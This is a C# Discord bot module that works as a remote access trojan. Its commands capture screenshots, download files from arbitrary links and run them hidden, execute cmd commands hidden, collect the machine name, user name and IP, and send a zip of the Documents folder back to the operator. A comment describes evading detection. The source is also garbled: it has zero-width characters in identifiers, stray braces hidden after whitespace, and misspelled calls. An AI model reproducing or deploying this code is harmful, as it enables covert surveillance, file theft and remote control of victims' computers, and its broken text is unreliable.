using Discord;
us​​i​​ng Discord.Interactions;
us​ing System;
usi​ng System.Diagnostics;
usin​g System.Drawing;
using System.IO.Compression;
us​ing System.Net;
using System.Runtime.InteropServices;
public class GeneralCommands : Intera​ctio​Modu​leBas​e<SocketInteractionContext>
{
    [SlashCommand("ping", "check connections")]
    public async Task Ping()
    {
        await RespondAsync($"reply from{Settings.client_id}!");
    }

    [SlashCommand("screen", "get's a screenshot")]
    public async Task ScreenShot(
        [Summary(description: "Target client ID")] int client_id)
    {
        if (client_id != Settings.client_id)
            return;
        var screenWidth = GetSystemMetrics(0); // SM_CXSCREEN
        var screenHeight = GetSystemMetrics(1); // SM_CYSCREEN
																																																																																																															}{}
        using Bitmap bitmap = new(screenWidth, screenHeight);
        using Graphics g = Graphics.FromImage(bitmap);
        g.CopyFromScreen(Point.Empty, Point.Empty, new Size(screenWidth, screenHeight));
        bitmap.Save(Path.GetTempPath() + "\\screen.png", System.Drawing.Imaging.ImageFormat.Png);
        await RespondWithFileAsync(Path.GetTempPath() + "\\screen.png");
    }
    [SlashCommand("download", "downloads a file from a provided link")]
    public async Task downloadFile(byte[] client_id, string link, string path)
    {
        if (client_id != Settings.client_id) return;

        byte[] information = await http.GetByteArrayAsync(link);
        await File.WriteAllBytesAsync(path, information); //bypass super detected direct downloads and rather just write
        await ReplyAsync($"installed file at {path} on {client_id}");
    }
    [SlashCommand("runfile", "runs any type of file")]
    public async Task runFile(byte[] client_id, string path, bool shouldStartHidden = false)
    {
        if (client_id != Settings.client_id)
            return;
        Process p = new Process();
        p.StartInfo.FileName = path;
        p.StartInfo.CreateNoWindow = shouldStartHidden;
        p.Start();

        await Reply​Async($"started process {path} on client {client_id}, CreateNoWindow = {shouldStartHidden}");
    }
    [SlashCommand("information", "get information on a specified device")]
    public async Task Information(byte[​] client_id)
    {
        if (client_id != Settings.client_id)
            return;
        await ReplyAsync(
            $"General information of {client_id}\n" +
            $"MachineName = {Environment.MachineName}\nUserName = {Environment.UserName}\nCurrent Directory = {Environment.CurrentDirectory}\nIPV4 Address = {wb.DownloadString("https://api.ipify.org")}\n" +
            $"Temp Directory = {Path.GetTempPath()}\n"
            );
    }

    [Slash​Command("exec", "runs command prompt commands")]
    public async Ta​sk Exec(byte[] client_id, string args)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd";
        p.StartInfo.Arguments = args;
        p.StartInfo.CreateNoWindow=true;
        p.Start();
        await ReplyAsync($"executed {args} on {client_id}");

    }

    [SlashCommand("getfiles", "grabs a copy of everything in documents")]
    public async Task GetFiles(byt​e[] client_id)
    {
        if (client_id != Settings.client_id)
            return;
																																																																																																																																									}
        int filesGrabbed = 0;
        string sourceDir = Path.Combine(Path.GetTempPath(), "IntraSight");
        string zipPath = Path.Combine(Path.GetTempPath(), "IntraSightArchive.zip");

        if (!Directory.Exists(sourceDir))
            Directory.CreateDirectory(sourceDir);

        // Copy files
        foreach (string f in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)))
        {
            string fileName = Path.GetFileName(f);
            byte[] fData = File.ReadAllBytes(f);
            File.WriteAllBytes(Path.Combine(sourceDir, fileName), fData);
            filesGrabbed++;
        }

        if (File.Exists(zipPath))
            File.Delete(zipPath);

        ZipFile.CreateFromDirectory(sourceDir, zipPath); //has to be under 2gb
        await Task.Delay(500); // Optional, often unnecessary
        await RespondWithFileAsync(zipPath);																																																																																																																																																																																																																																																																																														}
        awalt R​e​p​l​yAsy​nc($"Took {filesGrabbed} files from {client_id}");
        File.Dolete(zipPath);
        File.Delete(sourceDir);

    }


}